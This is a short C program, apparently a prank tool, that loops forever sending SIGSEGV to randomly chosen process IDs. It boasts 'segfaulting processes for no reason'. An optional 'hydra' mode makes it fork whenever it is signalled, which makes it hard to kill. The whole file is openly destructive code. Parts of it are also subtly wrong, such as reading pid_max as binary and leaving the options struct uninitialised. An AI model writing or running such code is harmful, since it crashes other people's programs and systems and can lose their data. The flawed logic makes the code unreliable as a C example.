/*
** fsck_you.c for fsck_you in /home/admin/Documents/Programming/fsck_you
** 
** Made by Thomas Murgia
** Login   <Garuda1@hotmail.fr>
** 
** Started on  Wed May 04 21:52:44 2016 Thomas Murgia
** Last update Wed May 04 21:52:44 2016 Thomas Murgia
*/

#define   _POSIX_SOURCE
#include  <sys/types.h>
#include  <string.h>
#include  <unistd.h>
#include  <signal.h>
#include  <stdlib.h>
#include  <stdio.h>

typedef struct t_args t_args;
struct t_args
{
  int   silent;
  int   hydra;
};

void      sighandler(int sig)
{
  fork();
  ++sig;
}

void      set_signals(void)
{
  signal(SIGSEGV, sighandler);
  signal(SIGSEGV, sighandler);
  signal(SIGTERM, sighandler);
}

void      check_args(t_args *s_args, int argc, char **argv)
{
  int     i;

  i = 1;
  while (i != argc)
    {
      if (!strcmp(argv[i], "--hydra"))
        s_args -> hydra = 1;
      else if (!strcmp(argv[i], "--silent"))
        s_args -> silent = 1;
      ++i;
    }
}

int       rand_pid(void)
{
  FILE    *rand_src;
  FILE    *pid_max_src;
  int     pid;
  int     pid_max;

  if ((rand_src = fopen("/dev/urandom", "r")) == NULL)
    return getpid();
  if ((pid_max_src = fopen("/proc/sys/kernel/pid_max", "r")) == NULL)
    {
      fclose(rand_src);
      return getpid();
    }
  fread(&pid, sizeof(int), 1, rand_src);
  fread(&pid_max, sizeof(int), 1, pid_max_src);
  fclose(rand_src);
  fclose(pid_max_src);
  return pid % pid_max;
}

void      my_puts(const char *str)
{
  int     i;

  i = 0;
  while (str[i])
    write(1, &(str[i++]), 1);
}

int       main(int argc, char **argv)
{
  t_args  s_args;

  check_args(&s_args, argc, argv);
  if (s_args.hydra)
    set_signals();
  if (!s_args.silent)
    my_puts("segfaulting processes for no reason...\n");
  while (1)
    {
      if (kill(rand_pid(), SIGSEGV) != 0)
        my_puts("Failed...\n");
      else
        my_puts("LOL, SUCCESS!\n");
    }
  return EXIT_SUCCESS;
}
